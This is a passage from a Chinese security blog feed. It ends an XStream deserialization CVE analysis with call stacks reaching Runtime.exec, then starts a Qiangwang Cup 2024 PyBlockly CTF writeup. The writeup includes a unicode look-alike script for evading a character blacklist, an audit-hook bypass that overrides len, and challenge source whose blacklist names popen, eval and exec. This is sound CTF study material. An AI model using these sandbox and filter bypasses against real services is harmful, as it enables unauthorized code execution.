(com.thoughtworks.xstream.core)</span><br><span class="line">convert:72, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:66, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshallField:499, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">doUnmarshal:425, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">unmarshal:277, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">convert:72, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:72, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:66, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshallField:499, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">doUnmarshal:425, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">unmarshal:277, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">convert:72, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:72, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:66, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshallField:499, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">doUnmarshal:425, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">unmarshal:277, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">convert:72, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:72, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:66, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshallField:499, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">doUnmarshal:425, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">unmarshal:277, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">convert:72, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:72, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:66, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshallField:499, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">doUnmarshal:425, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">unmarshal:277, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">convert:72, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:72, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:66, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:50, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">readFromStream:325, SerializableConverter$2 (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">readObjectOverride:123, CustomObjectInputStream (com.thoughtworks.xstream.core.util)</span><br><span class="line">readObject:365, ObjectInputStream (java.io)</span><br><span class="line">readObject:791, PriorityQueue (java.util)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">callReadObject:132, SerializationMembers (com.thoughtworks.xstream.core.util)</span><br><span class="line">doUnmarshal:443, SerializableConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">unmarshal:277, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">convert:72, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:72, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:66, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:50, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">start:134, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:32, AbstractTreeMarshallingStrategy (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:1429, XStream (com.thoughtworks.xstream)</span><br><span class="line">unmarshal:1409, XStream (com.thoughtworks.xstream)</span><br><span class="line">fromXML:1303, XStream (com.thoughtworks.xstream)</span><br><span class="line">main:26, Vul (POC.priorityQueue)</span><br></pre></td></tr></table></figure><h3 id="CVE-2021-39144"><a href="#CVE-2021-39144" class="headerlink" title="CVE-2021-39144"></a>CVE-2021-39144</h3><h4 id="影响范围-10"><a href="#影响范围-10" class="headerlink" title="影响范围"></a>影响范围</h4><p>XStream &lt;&#x3D; 1.4.17</p><h4 id="版本说明-10"><a href="#版本说明-10" class="headerlink" title="版本说明"></a>版本说明</h4><p>无</p><h4 id="漏洞分析-10"><a href="#漏洞分析-10" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>漏洞本质：比较有意思的是 sink 点，<code>DTraceProbe#uncheckedTrigger</code> 有一个可控的反射调用 invoke，其他没啥说的。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/468056dcf33e2cd2ebe140621371d113.png"></p><p>函数调用栈</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">start:1007, ProcessBuilder (java.lang)</span><br><span class="line">exec:620, Runtime (java.lang)</span><br><span class="line">exec:450, Runtime (java.lang)</span><br><span class="line">exec:347, Runtime (java.lang)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">uncheckedTrigger:58, DTraceProbe (sun.tracing.dtrace)</span><br><span class="line">triggerProbe:269, ProviderSkeleton (sun.tracing)</span><br><span class="line">invoke:178, ProviderSkeleton (sun.tracing)</span><br><span class="line">compareTo:-1, $Proxy0 (com.sun.proxy)</span><br><span class="line">siftDownComparable:704, PriorityQueue (java.util)</span><br><span class="line">siftDown:690, PriorityQueue (java.util)</span><br><span class="line">heapify:737, PriorityQueue (java.util)</span><br><span class="line">readObject:797, PriorityQueue (java.util)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">callReadObject:113, SerializationMethodInvoker (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">doUnmarshal:452, SerializableConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">unmarshal:257, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">convert:72, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:65, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:66, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:50, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">start:134, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:32, AbstractTreeMarshallingStrategy (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:1157, XStream (com.thoughtworks.xstream)</span><br><span class="line">unmarshal:1141, XStream (com.thoughtworks.xstream)</span><br><span class="line">fromXML:1021, XStream (com.thoughtworks.xstream)</span><br><span class="line">main:26, Vul (POC.priorityQueue)</span><br></pre></td></tr></table></figure><h2 id="小疑问"><a href="#小疑问" class="headerlink" title="小疑问"></a>小疑问</h2><p>他们这些 poc.xml 是怎么写出来的？虽然本质上还是找链子，但是自己还原成 xml 还是有难度，得去学习 xstream 的官方文档？？</p><p>答：baizhu的ysomap已经写了对应的逻辑： <a href="https://github.com/wh1t3p1g/ysomap">https://github.com/wh1t3p1g/ysomap</a> ，或者是直接使用 xstream 的 toxml？？</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li>官网： <a href="https://x-stream.github.io/security.html">https://x-stream.github.io/security.html</a></li><li>大部分看的这位师傅的： <a href="https://tttang.com/archive/1699/">https://tttang.com/archive/1699/</a></li><li><a href="https://y4tacker.github.io/2022/02/10/year/2022/2/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">https://y4tacker.github.io/2022/02/10/year/2022/2/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96</a></li><li><a href="https://www.cnblogs.com/LittleHann/p/17807249.html">https://www.cnblogs.com/LittleHann/p/17807249.html</a></li><li><a href="https://m0d9.me/2021/08/29/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94Tabby%20CVE%E4%B9%8B%E6%97%85/">https://m0d9.me/2021/08/29/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94Tabby%20CVE%E4%B9%8B%E6%97%85/</a></li><li>yso JRMP 分析： <a href="https://www.cnblogs.com/nice0e3/p/14333695.html">https://www.cnblogs.com/nice0e3/p/14333695.html</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;XStream 是一个将 java bean 对象与 xml 互相转换的依赖包，有点类似 fastjson 的 json 对象互转。&lt;/p&gt;</summary>
      
    
    
    
    
    <category term="Java" scheme="https://jaspersec.top/tags/Java/"/>
    
    <category term="反序列化" scheme="https://jaspersec.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="XStream" scheme="https://jaspersec.top/tags/XStream/"/>
    
  </entry>
  
  <entry>
    <title>强网杯2024 线上赛 writeup</title>
    <link href="https://jaspersec.top/posts/357825894.html"/>
    <id>https://jaspersec.top/posts/357825894.html</id>
    <published>2024-12-31T10:52:00.000Z</published>
    <updated>2025-03-31T22:09:47.237Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p> <a href="https://xmcve.com/">星盟安全团队</a>长期招新中~ 我们的目标是星辰大海！ </p><ul><li>简历格式：ID、联系方式、掌握技术、比赛情况</li><li>简历投递邮箱： <a href="mailto:&#120;&#109;&#x63;&#x76;&#x65;&#64;&#113;&#113;&#x2e;&#99;&#111;&#x6d;">&#120;&#109;&#x63;&#x76;&#x65;&#64;&#113;&#113;&#x2e;&#99;&#111;&#x6d;</a></li><li>联系QQ：1609410364</li></ul><p>强网杯 S8 Web赛题复现，顺手做了<code>docker</code>环境。<br>PS: 图片在GitHub图床，加载不出请更换网络。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/image-20241231190218034.png" alt="image-20241231190218034"></p><h2 id="PyBlockly"><a href="#PyBlockly" class="headerlink" title="PyBlockly"></a>PyBlockly</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name pyblockly -d -p 8888:8080 sketchpl4ne/qwb2024:pyblockly_img</span><br></pre></td></tr></table></figure><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p><strong>思路：python unicode编码绕过+pyjail ast沙箱绕过和audithook绕过</strong></p><p>审题，blockly_json这个接口，接受json格式数据，解析成对应的python代码，然后执行。</p><p>注意到 print 和 text 的分支存在代码拼接问题，构造下payload就可以执行任意python代码。</p><p>但题目有几个限制：</p><ul><li>代码执行不能出现 blacklist_pattern 里的字符</li><li>verify_secure 有AST沙箱，禁了import 和 from import</li><li>audit hook，有event的黑名单和长度限制</li></ul><p><strong>字符bypass：</strong> json.loads支持unicode，fuzz 字符相等，但是unicode不等的字符，并替换：</p><figure class="highlight python"><figcaption><span>title:fuzz.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">unicode_bypass</span>(<span class="params">payload</span>):  </span><br><span class="line">    waf = <span class="string">&quot;[!\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\\]^_`&#123;|&#125;~]&quot;</span>  </span><br><span class="line">    length = <span class="number">10500</span>  </span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> waf:  </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):  </span><br><span class="line">            <span class="keyword">if</span> unidecode.unidecode(<span class="built_in">chr</span>(i)) == c <span class="keyword">and</span> <span class="built_in">ord</span>(c) != i:  </span><br><span class="line">                payload = payload.replace(c, <span class="built_in">chr</span>(i))  </span><br><span class="line">                <span class="keyword">break</span>  </span><br><span class="line">        <span class="keyword">if</span> i == length-<span class="number">1</span>:  </span><br><span class="line">            <span class="built_in">print</span>(c + <span class="string">&quot; not found.&quot;</span>)  </span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><p><strong>AST沙箱和Audit hook绕过</strong> ：首先篡改内置函数len，把len设置成永久返回1，绕过长度限制；然后命令执行的payload选择的是 <a href="https://dummykitty.github.io/python/2023/05/30/pyjail-bypass-07-%E7%BB%95%E8%BF%87-audit-hook.html"> 这篇文章</a> 中<code>其他不触发hook的方式</code>中的第三个，从而绕过import，最终exp如下：</p><figure class="highlight python"><figcaption><span>title:exp.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> unidecode</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> importlib.util</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">blacklist_pattern = <span class="string">r&quot;[!\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\\]^_`&#123;|&#125;~]&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">module_exists</span>(<span class="params">module_name</span>):</span><br><span class="line">    spec = importlib.util.find_spec(module_name)</span><br><span class="line">    <span class="keyword">if</span> spec <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> module_name <span class="keyword">in</span> sys.builtin_module_names:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> spec.origin:</span><br><span class="line">        std_lib_path = os.path.dirname(os.__file__)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> spec.origin.startswith(std_lib_path) <span class="keyword">and</span> <span class="keyword">not</span> spec.origin.startswith(os.getcwd()):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_secure</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">for</span> node <span class="keyword">in</span> ast.walk(m):</span><br><span class="line">        <span class="keyword">match</span> <span class="built_in">type</span>(node):</span><br><span class="line">            <span class="keyword">case</span> ast.Import:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;ERROR: Banned module &quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">case</span> ast.ImportFrom:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;ERROR: Banned module <span class="subst">&#123;node.module&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_for_blacklisted_symbols</span>(<span class="params">input_text</span>):</span><br><span class="line">    <span class="keyword">if</span> re.search(blacklist_pattern, input_text):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="comment">## return False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">block_to_python</span>(<span class="params">block</span>):</span><br><span class="line">    block_type = block[<span class="string">&#x27;type&#x27;</span>]</span><br><span class="line">    code = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> block_type == <span class="string">&#x27;print&#x27;</span>:</span><br><span class="line">        text_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;TEXT&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        text = block_to_python(text_block)</span><br><span class="line">        code = <span class="string">f&quot;print(<span class="subst">&#123;text&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;math_number&#x27;</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;NUM&#x27;</span>]).isdigit():</span><br><span class="line">            code = <span class="built_in">int</span>(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;NUM&#x27;</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;text&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> check_for_blacklisted_symbols(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;TEXT&#x27;</span>]):</span><br><span class="line">            code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            code = <span class="string">&quot;&#x27;&quot;</span> + unidecode.unidecode(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;TEXT&#x27;</span>]) + <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;max&#x27;</span>:</span><br><span class="line"></span><br><span class="line">        a_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;A&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        b_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;B&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        a = block_to_python(a_block)</span><br><span class="line">        b = block_to_python(b_block)</span><br><span class="line">        code = <span class="string">f&quot;max(<span class="subst">&#123;a&#125;</span>, <span class="subst">&#123;b&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;min&#x27;</span>:</span><br><span class="line">        a_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;A&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        b_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;B&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        a = block_to_python(a_block)</span><br><span class="line">        b = block_to_python(b_block)</span><br><span class="line">        code = <span class="string">f&quot;min(<span class="subst">&#123;a&#125;</span>, <span class="subst">&#123;b&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;next&#x27;</span> <span class="keyword">in</span> block:</span><br><span class="line"></span><br><span class="line">        block = block[<span class="string">&#x27;next&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        code += <span class="string">&quot;\n&quot;</span> + block_to_python(block) + <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> code</span><br><span class="line">    <span class="keyword">return</span> code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">json_to_python</span>(<span class="params">blockly_data</span>):</span><br><span class="line">    block = blockly_data[<span class="string">&#x27;blocks&#x27;</span>][<span class="string">&#x27;blocks&#x27;</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    python_code = <span class="string">&quot;&quot;</span></span><br><span class="line">    python_code += block_to_python(block) + <span class="string">&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> python_code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do</span>(<span class="params">source_code</span>):</span><br><span class="line">    hook_code = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def my_audit_hook(event_name, arg):</span></span><br><span class="line"><span class="string">    blacklist = [&quot;popen&quot;, &quot;input&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;compile&quot;, &quot;memoryview&quot;]</span></span><br><span class="line"><span class="string">    if len(event_name) &gt; 4:</span></span><br><span class="line"><span class="string">        raise RuntimeError(&quot;Too Long!&quot;)</span></span><br><span class="line"><span class="string">    for bad in blacklist:</span></span><br><span class="line"><span class="string">        if bad in event_name:</span></span><br><span class="line"><span class="string">            raise RuntimeError(&#x27;Operation not permitted: &#123;&#125;&#x27;.format(event_name))</span></span><br><span class="line"><span class="string">            #raise RuntimeError(&quot;No!&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">__import__(&#x27;sys&#x27;).addaudithook(my_audit_hook)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(source_code)</span><br><span class="line">    code = hook_code + source_code</span><br><span class="line">    tree = <span class="built_in">compile</span>(source_code, <span class="string">&quot;run.py&quot;</span>, <span class="string">&#x27;exec&#x27;</span>, flags=ast.PyCF_ONLY_AST)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> verify_secure(tree):</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;run.py&quot;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(code)</span><br><span class="line">            result = subprocess.run([<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;run.py&#x27;</span>], stdout=subprocess.PIPE, timeout=<span class="number">5</span>).stdout.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">            os.remove(<span class="string">&#x27;run.py&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Execution aborted due to security concerns.&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        os.remove(<span class="string">&#x27;run.py&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Timeout!&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blockly_json</span>():</span><br><span class="line">    blockly_data = request.get_data()</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(blockly_data))</span><br><span class="line">    blockly_data = json.loads(blockly_data.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(blockly_data)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        python_code = json_to_python(blockly_data)</span><br><span class="line">        <span class="keyword">return</span> do(python_code)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Error generating Python code&quot;</span>, <span 